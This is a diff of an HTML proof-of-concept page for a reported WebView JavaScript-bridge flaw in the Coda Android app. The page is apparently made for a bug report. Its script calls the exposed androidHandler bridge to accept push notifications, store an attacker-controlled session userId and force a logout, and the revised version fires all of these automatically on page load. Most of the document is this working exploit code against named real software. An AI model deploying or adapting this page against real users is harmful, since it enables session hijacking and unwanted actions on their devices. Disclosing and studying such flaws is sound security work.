@@ -1,73 +1,296 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Coda WebWrapper Bridge Exploitation</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Coda WebWrapper Vulnerability PoC</title>
     <style>
-        body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
-        .box { border: 2px solid #00ff00; padding: 15px; margin: 10px 0; }
-        .success { background: #001a00; border-color: #00ff00; }
-        .error { background: #1a0000; border-color: #ff0000; }
-        h1 { color: #00ff00; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(135deg, #1a1a1a 0%, #0d0d0d 100%);
+            color: #00ff00;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+            border-bottom: 3px solid #00ff00;
+            padding-bottom: 20px;
+        }
+        
+        h1 {
+            font-size: 28px;
+            color: #00ff00;
+            text-shadow: 0 0 10px #00ff00;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            color: #888;
+            font-size: 14px;
+        }
+        
+        .box {
+            border: 2px solid #00ff00;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 15px 0;
+            background-color: rgba(0, 255, 0, 0.05);
+        }
+        
+        .box.success {
+            border-color: #00ff00;
+            background-color: rgba(0, 255, 0, 0.1);
+        }
+        
+        .box.error {
+            border-color: #ff0000;
+            background-color: rgba(255, 0, 0, 0.1);
+            color: #ff0000;
+        }
+        
+        .box.warning {
+            border-color: #ffaa00;
+            background-color: rgba(255, 170, 0, 0.1);
+            color: #ffaa00;
+        }
+        
+        .log-entry {
+            margin: 8px 0;
+            padding: 8px;
+            border-left: 3px solid #00ff00;
+            padding-left: 12px;
+        }
+        
+        .log-entry.error {
+            border-left-color: #ff0000;
+            color: #ff0000;
+        }
+        
+        .log-entry.warning {
+            border-left-color: #ffaa00;
+            color: #ffaa00;
+        }
+        
+        .log-entry.success {
+            border-left-color: #00ff00;
+            color: #00ff00;
+        }
+        
+        button {
+            background-color: #00ff00;
+            color: #000000;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-weight: bold;
+            font-family: monospace;
+            margin: 5px;
+            transition: all 0.3s;
+        }
+        
+        button:hover {
+            background-color: #00dd00;
+            box-shadow: 0 0 10px #00ff00;
+        }
+        
+        button:active {
+            transform: scale(0.95);
+        }
+        
+        .divider {
+            height: 1px;
+            background: linear-gradient(to right, transparent, #00ff00, transparent);
+            margin: 20px 0;
+        }
+        
+        .footer {
+            text-align: center;
+            color: #666;
+            font-size: 12px;
+            margin-top: 30px;
+        }
     </style>
 </head>
 <body>
-    <h1>🔴 CODA WEBWRAPPER VULNERABILITY PROOF 🔴</h1>
-    
-    <div id="results"></div>
+    <div class="container">
+        <header>
+            <h1>🔴 CODA WEBWRAPPER VULNERABILITY PoC 🔴</h1>
+            <p class="subtitle">CWE-749: Insecure JavaScript Interface Exposure</p>
+        </header>
+
+        <div class="box">
+            <p>This page demonstrates the critical vulnerability in <code>io.coda.codaapp.WebWrapper</code></p>
+            <p style="margin-top: 10px;">The app exposes a JavaScript bridge without proper access controls.</p>
+        </div>
+
+        <div id="results"></div>
+
+        <div class="box">
+            <p><strong>Manual Test Buttons:</strong></p>
+            <button onclick="testBridge()">Test Bridge Existence</button>
+            <button onclick="testGetFeatures()">Call GetSupportedFeatures</button>
+            <button onclick="testAcceptNotif()">Call AcceptPushNotifications</button>
+            <button onclick="testStoreSession()">Call StoreSessionData (CRITICAL)</button>
+            <button onclick="testLogout()">Call Logout</button>
+            <button onclick="clearLog()">Clear Log</button>
+        </div>
+
+        <div class="footer">
+            <p>Report: Coda Android App - WebView JavaScript Interface Vulnerability</p>
+            <p>Severity: CRITICAL | CVSS: 8.2</p>
+        </div>
+    </div>
 
     <script>
-        const results = document.getElementById('results');
-        
+        const resultsDiv = document.getElementById('results');
+
         function log(msg, type = 'info') {
-            const box = document.createElement('div');
-            box.className = `box ${type}`;
-            box.textContent = msg;
-            results.appendChild(box);
-            console.log('[' + type.toUpperCase() + ']', msg);
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            
+            // Add timestamp
+            const timestamp = new Date().toLocaleTimeString();
+            entry.textContent = `[${timestamp}] ${msg}`;
+            
+            resultsDiv.appendChild(entry);
+            resultsDiv.scrollTop = resultsDiv.scrollHeight;
+            
+            console.log(`[${type.toUpperCase()}] ${msg}`);
         }
 
-        log('Checking for androidHandler bridge...');
+        function clearLog() {
+            resultsDiv.innerHTML = '';
+            log('Log cleared', 'info');
+        }
 
-        // ✅ TEST 1: Bridge exists
-        if (typeof androidHandler !== 'undefined') {
-            log('✅ SUCCESS: androidHandler bridge is EXPOSED!', 'success');
-            log('This proves io.coda.codaapp.WebWrapper is vulnerable to JavaScript→Native code execution', 'success');
+        // Auto-run tests on page load
+        window.addEventListener('load', function() {
+            log('Page loaded. Starting vulnerability assessment...', 'info');
+            setTimeout(autoRunTests, 1000);
+        });
+
+        function autoRunTests() {
+            log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'info');
+            log('AUTOMATIC VULNERABILITY TEST STARTED', 'warning');
+            log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'info');
             
+            testBridge();
+            
+            setTimeout(() => {
+                if (typeof androidHandler !== 'undefined') {
+                    log('Bridge is VULNERABLE! Running payload tests...', 'warning');
+                    
+                    setTimeout(() => testGetFeatures(), 500);
+                    setTimeout(() => testAcceptNotif(), 1500);
+                    setTimeout(() => testStoreSession(), 2500);
+                    setTimeout(() => testLogout(), 3500);
+                    
+                    setTimeout(() => {
+                        log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'warning');
+                        log('🔴 VULNERABILITY CONFIRMED 🔴', 'warning');
+                        log('CWE-749: Insecure JavaScript Interface', 'warning');
+                        log('Impact: Arbitrary Android Native Code Execution', 'warning');
+                        log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'warning');
+                    }, 4500);
+                }
+            }, 1500);
+        }
+
+        function testBridge() {
+            log('TEST 1: Checking for androidHandler bridge...', 'info');
+            
+            if (typeof androidHandler !== 'undefined') {
+                log('✅ SUCCESS: androidHandler bridge is EXPOSED!', 'success');
+                log('This proves the vulnerability exists in the app!', 'success');
+                return true;
+            } else {
+                log('❌ Bridge NOT found. (Not running in vulnerable Coda app?)', 'error');
+                return false;
+            }
+        }
+
+        function testGetFeatures() {
+            if (typeof androidHandler === 'undefined') {
+                log('❌ Bridge not available', 'error');
+                return;
+            }
+            
+            log('TEST 2: Calling GetSupportedFeatures...', 'info');
             try {
-                // ✅ TEST 2: Call GetSupportedFeatures (safe test)
-                const payload1 = JSON.stringify({ action: "GetSupportedFeatures" });
-                const resp1 = androidHandler.postMessage(payload1);
-                log('✅ GetSupportedFeatures() executed: ' + resp1, 'success');
+                const payload = JSON.stringify({ action: "GetSupportedFeatures" });
+                const response = androidHandler.postMessage(payload);
+                log('✅ GetSupportedFeatures executed', 'success');
+                log('Response: ' + response, 'success');
+            } catch (e) {
+                log('❌ Error: ' + e.message, 'error');
+            }
+        }
 
-                // ✅ TEST 3: Call sensitive action - AcceptPushNotifications
-                const payload2 = JSON.stringify({ action: "AcceptPushNotifications" });
-                androidHandler.postMessage(payload2);
-                log('✅ AcceptPushNotifications() executed - User notification access HIJACKED!', 'success');
+        function testAcceptNotif() {
+            if (typeof androidHandler === 'undefined') {
+                log('❌ Bridge not available', 'error');
+                return;
+            }
+            
+            log('TEST 3: Calling AcceptPushNotifications...', 'info');
+            try {
+                const payload = JSON.stringify({ action: "AcceptPushNotifications" });
+                const response = androidHandler.postMessage(payload);
+                log('⚠️ AcceptPushNotifications executed', 'warning');
+                log('Response: ' + response, 'warning');
+            } catch (e) {
+                log('❌ Error: ' + e.message, 'error');
+            }
+        }
 
-                // ✅ TEST 4: StoreSessionData (CRITICAL - Session Hijacking)
-                const payload3 = JSON.stringify({ 
+        function testStoreSession() {
+            if (typeof androidHandler === 'undefined') {
+                log('❌ Bridge not available', 'error');
+                return;
+            }
+            
+            log('TEST 4: Calling StoreSessionData (CRITICAL)...', 'warning');
+            try {
+                const payload = JSON.stringify({
                     action: "StoreSessionData",
                     userId: "ATTACKER_CONTROLLED_ID_" + Date.now()
                 });
-                androidHandler.postMessage(payload3);
-                log('🔴 CRITICAL: StoreSessionData() executed - SESSION CAN BE HIJACKED!', 'success');
-
-                // ✅ TEST 5: Trigger Logout
-                const payload4 = JSON.stringify({ action: "Logout" });
-                androidHandler.postMessage(payload4);
-                log('⚠️ Logout triggered - User will be forced to re-authenticate!', 'success');
-
-                log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'success');
-                log('VULNERABILITY CONFIRMED: io.coda.codaapp.WebWrapper exposed dangerous bridge!', 'success');
-                log('CWE-749: Exposure of Private Information to an Unauthorized Actor', 'success');
-                log('CVSS Score: 8.2 (HIGH)', 'success');
-                
-            } catch(e) {
-                log('Error: ' + e.message, 'error');
+                const response = androidHandler.postMessage(payload);
+                log('🔴 CRITICAL: StoreSessionData executed!', 'warning');
+                log('SESSION HIJACKING POSSIBLE!', 'warning');
+                log('Response: ' + response, 'warning');
+            } catch (e) {
+                log('❌ Error: ' + e.message, 'error');
             }
-        } else {
-            log('❌ androidHandler NOT found. This page is not running in vulnerable Coda App.', 'error');
-            log('(This is expected if you\'re viewing this in a browser, not the Coda Android App)', 'error');
+        }
+
+        function testLogout() {
+            if (typeof androidHandler === 'undefined') {
+                log('❌ Bridge not available', 'error');
+                return;
+            }
+            
+            log('TEST 5: Calling Logout...', 'info');
+            try {
+                const payload = JSON.stringify({ action: "Logout" });
+                const response = androidHandler.postMessage(payload);
+                log('⚠️ Logout executed', 'warning');
+                log('User would be forced to re-authenticate!', 'warning');
+                log('Response: ' + response, 'warning');
+            } catch (e) {
+                log('❌ Error: ' + e.message, 'error');
+            }
         }
     </script>
 </body>
